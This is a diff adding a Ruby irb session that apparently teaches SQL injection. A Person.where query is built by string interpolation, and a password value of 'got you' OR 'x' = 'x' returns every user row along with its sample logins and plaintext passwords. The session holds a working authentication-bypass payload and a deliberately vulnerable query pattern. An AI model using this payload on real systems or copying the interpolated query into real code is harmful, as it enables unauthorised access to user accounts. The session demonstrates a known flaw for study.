@@ -1,0 +1,18 @@
+irb(main):003:0> login = "john2; pass = "no_idea"
+irb(main):004:0"
+irb(main):005:0"
+irb(main):006:0"
+irb(main):007:0" ^C
+irb(main):007:0> login = "john2"; pass = "no_idea"
+=> "no_idea"
+irb(main):008:0> Person.where("login = '#{login}' AND pass = '#{pass}'")
+  Person Load (1.1ms)  SELECT  "people".* FROM "people" WHERE (login = 'john2' AND pass = 'no_idea') LIMIT ?  [["LIMIT", 11]]
+=> #<ActiveRecord::Relation [#<Person id: 12, first_name: "John", age: 27, last_name: "Smith", created_at: "2019-07-03 00:48:40", updated_at: "2019-07-03 00:48:40", login: "john2", pass: "no_idea">]>
+irb(main):009:0> pass = "got you' OR 'x' = 'x"
+=> "got you' OR 'x' = 'x"
+irb(main):010:0> Person.where("login = '#{login}' AND pass = '#{pass}'")
+  Person Load (0.4ms)  SELECT  "people".* FROM "people" WHERE (login = 'john2' AND pass = 'got you' OR 'x' = 'x') LIMIT ?  [["LIMIT", 11]]
+=> #<ActiveRecord::Relation [#<Person id: 8, first_name: "Kalman", age: 33, last_name: "Smith", created_at: "2019-07-03 00:48:40", updated_at: "2019-07-03 00:48:40", login: "kman", pass: "abc123">, #<Person id: 9, first_name: "John", age: 27, last_name: "Whatever", created_at: "2019-07-03 00:48:40", updated_at: "2019-07-03 00:48:40", login: "john1", pass: "123abc">, #<Person id: 10, first_name: "Michael", age: 15, last_name: "Smith", created_at: "2019-07-03 00:48:40", updated_at: "2019-07-03 00:48:40", login: "mike", pass: "not_telling">, #<Person id: 11, first_name: "Josh", age: 57, last_name: "Oreck", created_at: "2019-07-03 00:48:40", updated_at: "2019-07-03 00:48:40", login: "josh", pass: "password1">, #<Person id: 12, first_name: "John", age: 27, last_name: "Smith", created_at: "2019-07-03 00:48:40", updated_at: "2019-07-03 00:48:40", login: "john2", pass: "no_idea">, #<Person id: 13, first_name: "Bill", age: 75, last_name: "Gates", created_at: "2019-07-03 00:48:40", updated_at: "2019-07-03 00:48:40", login: "bill", pass: "windows3.1">, #<Person id: 14, first_name: "LeBron", age: 30, last_name: "James", created_at: "2019-07-03 00:48:40", updated_at: "2019-07-03 00:48:40", login: "bron", pass: "need more rings">]>
+irb(main):011:0>
+
+# Pay attention to the quotes in the pass above
